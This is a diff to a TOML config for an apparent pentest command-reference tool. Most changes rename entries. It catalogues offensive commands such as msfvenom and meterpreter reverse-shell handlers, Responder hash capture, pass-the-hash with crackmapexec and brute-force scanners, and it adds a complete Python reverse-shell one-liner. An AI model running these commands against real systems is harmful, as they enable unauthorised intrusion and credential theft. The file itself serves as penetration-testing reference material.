@@ -14,7 +14,7 @@ destination = "127.0.0.1"
 # ===== NETWORK COMMANDS ===== #
 # ============================ #
 
-[command.evilwinrm0]
+[command.Evil-WinRM]
 name_exe = "evil-winrm"
 cmd_types = "network"
 args = "-i <ip|127.0.0.1> -u <username> -p <password>"
@@ -38,7 +38,7 @@ examples = [
     "evil-winrm -i 127.0.0.1 -u 'domain/username' -p 'password'"
 ]
 
-[command.remmina0]
+[command.Remmina]
 name_exe = "remmina"
 cmd_types = "network"
 args = "-c rdp://<user:password>@<ip|127.0.0.1>"
@@ -49,7 +49,7 @@ examples = [
     "remmina -c rdp://user:password@127.0.0.1"
 ]
 
-[command.xfreerdp0]
+[command.XfreeRDP-0]
 name_exe = "xfreerdp"
 cmd_types = "network"
 args = "/cert:ignore /u:<user> /p:<password> /v:<ip|127.0.0.1>"
@@ -60,7 +60,7 @@ examples = [
     "xfreerdp /u:user /p:password /v:127.0.0.1"
 ]
 
-[command.xfreerdp1]
+[command.XfreeRDP-1]
 name_exe = "xfreerdp"
 cmd_types = "network"
 args = "/cert:<status|ignore> /d:<domain|corp.local> /u:<user> /p:<password> /v:<ip|127.0.0.1>"
@@ -71,7 +71,7 @@ examples = [
     "xfreerdp /u:user /p:password /v:127.0.0.1"
 ]
 
-[command.pwsh0]
+[command.PwSh0]
 name_exe = "pwsh-preview"
 cmd_types = "misc"
 args = "-c '[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(\"<command>\"))'"
@@ -82,7 +82,7 @@ examples = [
     "pwsh-preview -c 'Convert::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(\"ping 127.0.0.1\"))'"
 ]
 
-[command.ssh0]
+[command.SSH]
 name_exe = "ssh"
 cmd_types = "network"
 args = "-o 'UserKnownHostsFile=/dev/null' -o 'StrictHostKeyChecking=no' -o 'Loglevel=QUIET' <conn|user@127.0.0.1>"
@@ -97,7 +97,7 @@ examples = [
 # ===== SYSADMIN COMMANDS =====
 # ============================ #
 
-[command.shell0]
+[command.UpgradeShell]
 name_exe = "python3"
 cmd_types = "sysadmin"
 explanation = "Upgrade shell for more flexibility"
@@ -107,7 +107,7 @@ examples = [
     "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"
 ]
 
-[command.capabilities0]
+[command.Capabilities]
 name_exe = "getcap"
 cmd_types = "sysadmin"
 explanation = "Search binaries with capabilities (often require sudo)"
@@ -117,7 +117,7 @@ examples = [
     "sudo getcap /usr/bin/ping"
 ]
 
-[command.ip0]
+[command.IP]
 name_exe = "ip"
 cmd_types = "sysadmin"
 explanation = "Put up/down an interface"
@@ -127,7 +127,7 @@ examples = [
     "link set dev eth0 up"
 ]
 
-[command.ufw0]
+[command.UFW]
 name_exe = "ufw"
 cmd_types = "sysadmin"
 explanation = "Allow ip to contacted our machine"
@@ -136,13 +136,13 @@ examples = [
     "ufw allow from 192.168.0.101"
 ]
 
-[command.icacls0]
+[command.Icacls]
 name_exe = "icacls"
 cmd_types = "sysadmin"
 explanation = "Check file/folder permission for users"
 args = "<path>"
 
-[command.mysql0]
+[command.MySQL]
 name_exe = "mysql"
 cmd_types = "sysadmin"
 explanation = "Connect to a mysql database"
@@ -155,7 +155,7 @@ examples = [
 # ===== PENTEST COMMANDS =====
 # ============================ #
 
-[command.nmap0]
+[command.Nmap-0]
 name_exe = "nmap"
 cmd_types = "pentest|network"
 explanation = "Scanning all ports with SYN scan and saving in file"
@@ -164,7 +164,7 @@ examples = [
     "nmap -sV -sS -Pn -p- -oN scan.nmap 127.0.0.1"
 ]
 
-[command.nmap1]
+[command.Nmap-1]
 name_exe = "nmap"
 cmd_types = "pentest|network"
 explanation = "Version -sV, default script -sC"
@@ -174,7 +174,7 @@ examples = [
     "nmap -sV -p 443 --script 'vuln'"
 ]
 
-[command.nmap2]
+[command.Nmap-2]
 name_exe = "nmap"
 cmd_types = "pentest|network"
 explanation = "SMB OS discovery"
@@ -183,7 +183,7 @@ examples = [
     "nmap -n -p139,445 --script smb-os-discovery  127.0.0.1"
 ]
 
-[command.dnsenum0]
+[command.DNSEnum]
 name_exe = "dnsenum"
 cmd_types = "pentest|network"
 explanation = "DNS Enumeration"
@@ -192,7 +192,7 @@ examples = [
     "dnsenum example.com"
 ]
 
-[command.enum4linux0]
+[command.Enum4Linux]
 name_exe = "enum4linux"
 cmd_types = "pentest|network"
 explanation = "SMB Enumeration"
@@ -201,7 +201,7 @@ examples = [
     "enum4linux example.com"
 ]
 
-[command.onesixtyone0]
+[command.OneSixtyOne]
 name_exe = "onesixtyone"
 cmd_types = "pentest|network"
 explanation = "SNMP Bruteforce Attack"
@@ -210,7 +210,7 @@ examples = [
     "onesixtyone -c communities.txt -i ips.txt"
 ]
 
-[command.snmpwalk0]
+[command.SNMPWalk]
 name_exe = "snmpwalk"
 cmd_types = "pentest|network"
 explanation = "SNMP Enumeration"
@@ -223,7 +223,7 @@ examples = [
     "snmpwalk -c public -v1 192.168.50.151 1.3.6.1.2.1.6.13.1.3  # List all machine TCP listening ports"
 ]
 
-[command.host0]
+[command.Host]
 name_exe = "host"
 cmd_types = "pentest|network"
 explanation = "DNS Enumeration with type handling"
@@ -232,7 +232,7 @@ examples = [
     "dnsenum -t mx example.com"
 ]
 
-[command.ffuf0]
+[command.FFUF-0]
 name_exe = "ffuf"
 cmd_types = "pentest"
 explanation = """Bruteforce directory, FUZZ keyword is mandatory and a `/` at the end also otherwise it's not gonna work.
@@ -243,7 +243,7 @@ examples = [
     "ffuf -u http://localhost/FUZZ/ -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt -fs 1000"
 ]
 
-[command.ffuf1]
+[command.FFUF-1]
 name_exe = "ffuf"
 cmd_types = "pentest"
 explanation = "Bruteforce subdomain"
@@ -252,7 +252,7 @@ examples = [
     "ffuf -w '/opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FHOST' -u 'http://localhost/' -H 'Host:FHOST.localhost' -t 100"
 ]
 
-[command.sqlmap0]
+[command.SQLMap]
 name_exe = "sqlmap"
 cmd_types = "pentest"
 explanation = "SQL injection of username/password"
@@ -261,7 +261,7 @@ examples = [
     "sqlmap -u 'http://searcher.htb/search' --data 'username=admin&password=password'"
 ]
 
-[command.dirb0]
+[command.Dirb]
 name_exe = "dirb"
 cmd_types = "pentest"
 explanation = "Bruteforce url paths"
@@ -270,7 +270,7 @@ examples = [
     "dirb http://10.10.11.242/ /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt"
 ]
 
-[command.gobuster0]
+[command.Gobuster]
 name_exe = "gobuster"
 cmd_types = "pentest"
 explanation = "Bruteforce url paths with blacklist status code"
@@ -279,7 +279,7 @@ examples = [
     "gobuster dir -u 127.0.0.1 -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt -t 5 --status-codes-blacklist 404,301"
 ]
 
-[command.find0]
+[command.Find]
 name_exe = "find"
 cmd_types = "pentest|sysadmin"
 explanation = "Find binaries with SUID bit set"
@@ -288,7 +288,7 @@ examples = [
     "find / -perm -4000 2> /dev/null"
 ]
 
-[command.msfvenom0]
+[command.Msfvenom]
 name_exe = "msfvenom"
 cmd_types = "pentest"
 explanation = "Create reverse shell tcp"
@@ -297,7 +297,7 @@ examples = [
     "msfvenom -p payload|windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f exe > reverse_tcp.exe"
 ]
 
-[command.msfconsole0]
+[command.Msfconsole]
 name_exe = "msfconsole"
 cmd_types = "pentest"
 explanation = "Handler reverse shell tcp"
@@ -306,7 +306,7 @@ examples = [
     "msfconsole -q -x 'use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 127.0.0.1;set LPORT 4444;run;'"
 ]
 
-[command.hashcat0]
+[command.Hashcat]
 name_exe = "hashcat"
 cmd_types = "pentest"
 explanation = """
@@ -318,7 +318,7 @@ examples = [
     "hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt"
 ]
 
-[command.pspy64s0]
+[command.PsPy64s0]
 name_exe = "pspy64s"
 cmd_types = "pentest"
 explanation = """
@@ -329,7 +329,7 @@ examples = [
     "pspy64s -i 100"
 ]
 
-[command.nmap3]
+[command.Nmap-3]
 name_exe = "cat"
 cmd_types = "pentest"
 explanation = """
@@ -341,7 +341,7 @@ examples = [
     "nmap --script-updatedb"
 ]
 
-[command.ldapdomaindump0]
+[command.LDAPDomainDump]
 name_exe = "ldapdomaindump"
 cmd_types = "pentest"
 explanation = "Dump LDAP information"
@@ -350,7 +350,7 @@ examples = [
     "ldapdomaindump -u 'CORP.local/user' -p 'ba0ecf3dcda348e7a91e548719c3ac6e:12943dbced43cd06a0445dd11fac3a7d' -at NTLM ldap://127.0.0.1"
 ]
 
-[command.crackmapexec0]
+[command.CrackMapExec]
 name_exe = "crackmapexec"
 cmd_types = "pentest"
 explanation = "List shares on list of machines"
@@ -359,7 +359,7 @@ examples = [
     "crackmapexec smb ips.txt -u user -H <NTHASH> --shares"
 ]
 
-[command.smbclient0]
+[command.SMBClient-0]
 name_exe = "smbclient.py"
 cmd_types = "pentest"
 explanation = "Setup an smb share"
@@ -368,38 +368,55 @@ examples = [
     "smbclient.py c ./"
 ]
 
-[command.http_server0]
-name_exe = "python3 -m http.server"
+[command.SMBClient-1]
+name_exe = "smbclient"
+cmd_types = "pentest"
+args = "-L //<ip|127.0.0.1>/ -U <user> --password=<password>"
+examples = [
+    "smbclient -L //127.0.0.1/ -U user --password=adminpass"
+]
+
+[command.HTTPServer]
+name_exe = "python3"
 cmd_types = "pentest"
 explanation = "Setup an HTTP server"
-args = "--bind <ip|127.0.0.1> <port|8000>"
+args = "-m http.server --bind <ip|127.0.0.1> <port|8000>"
 examples = [
     "python3 -m http.server --bind 127.0.0.1 8000"
 ]
 
-[command.Responder0]
-name_exe = "sudo python3 Responder.py"
+[command.Responder]
+name_exe = "python3"
 cmd_types = "pentest"
 explanation = "Gather NTHASH on network"
-args = "-I <local-interface> -i <ip|127.0.0.1>"
+args = "Responder.py -I <local-interface> -i <ip|127.0.0.1>"
 examples = [
     "sudo python3 Responder.py -I enp0s3 -i 192.168.3.85"
 ]
 
-[command.mssqlclient0]
-name_exe = "python3 mssqlclient.py"
+[command.MSSQLClient]
+name_exe = "python3"
 cmd_types = "pentest"
 explanation = "Connect to a MSSQL database instance"
-args = "<username:password@ip|sa:pass@127.0.0.1> -db <dbname>"
+args = "mssqlclient.py <username:password@ip|sa:pass@127.0.0.1> -db <dbname>"
 examples = [
     "mssqlclient.py sa:password@127.0.0.1 -db database"
+]
+
+[command.ConnectBack]
+name_exe = "python3"
+cmd_types = "pentest|network"
+explaination = "Connect back and spawn a clean terminal with python subprocess"
+args = "-c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\" <ip|127.0.0.1> \", <port|4444> ));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
+examples = [
+    "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"127.0.0.1\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
 ]
 
 
 # ===== REVERSE COMMANDS =====
 # ============================ #
 
-[command.objdump0]
+[command.Objdump]
 name_exe = "objdump"
 cmd_types = "reverse"
 explanation = "Display information from the binary in <type> format"
